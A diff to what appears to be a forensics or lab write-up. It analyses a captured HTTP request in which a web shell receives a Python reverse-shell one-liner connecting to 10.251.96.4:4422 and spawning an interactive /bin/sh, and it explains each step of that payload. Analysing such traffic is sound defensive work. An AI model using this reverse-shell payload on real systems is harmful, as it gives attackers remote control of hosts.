@@ -98,7 +98,7 @@ We can spot the first commands used in the web shell :
 "16201","2021-02-07 16:42:35.675646891","10.251.96.4","10.251.96.5","HTTP","706","GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1 "
 ```
 
-The last request is trying to exploit a vulnerability in the server by injecting a Python one-liner that establishes a reverse shell connection to the specified IP and port in the following steps:
+The last request is trying to exploit a vulnerability in the server by injecting a TCP-based Python reverse shell with connection to the specified IP and port in the following steps:
 
 - Imports the socket, subprocess, and os modules.
 ```
@@ -112,7 +112,7 @@ s.connect(("10.251.96.4",4422));
 ```
 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
 ```
-- Calls /bin/sh (a shell) with the -i flag, which starts an interactive shell.
+- When the code executes /bin/sh the shell inherits the redirections and communicates with the remote user via the socket 
 
 ```
 p=subprocess.call(["/bin/sh","-i"]);
